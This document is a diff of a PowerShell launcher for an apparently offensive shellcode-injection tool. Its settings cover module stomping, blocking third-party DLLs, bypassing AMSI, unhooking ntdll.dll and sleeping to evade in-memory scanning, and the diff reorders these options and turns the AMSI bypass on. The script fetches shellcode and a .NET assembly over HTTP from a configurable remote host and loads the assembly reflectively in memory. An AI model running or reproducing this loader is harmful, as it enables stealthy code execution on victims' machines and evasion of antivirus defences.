@@ -50,20 +50,20 @@ $J = "msvcp_win.dll"
 # name of the module (DLL) to stomp (used in "modulestomping")
 $K = "xpsservices.dll"
 
-# exported function to overwrite (used in "modulestomping")
+# exported function name to overwrite (used in "modulestomping")
 $L = "DllCanUnloadNow"
 
-# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
-$M = "True"
+# number of seconds (approx.) to sleep before execution to evade in-memory scan (for values greater than "60" it will take much longer to sleep)
+$M = "0"
 
-# bypass AMSI ("True" / "False")
+# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $N = "True"
 
-# unhook ntdll.dll ("True" / "False")
-$O = "False"
+# bypass AMSI ("True" / "False")
+$O = "True"
 
-# number of seconds (approx.) to sleep before execution to evade in-memory scan (for values greater than "60" it will take much longer to sleep)
-$P = "0"
+# unhook ntdll.dll ("True" / "False")
+$P = "False"
 
 # --------------------------------------------------------------------
 
@@ -86,7 +86,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /blockDlls:${M} /am51:${N} /unhook:${O} /sleep:${P}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /sleep:${M} /blockDlls:${N} /am51:${O} /unhook:${P}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
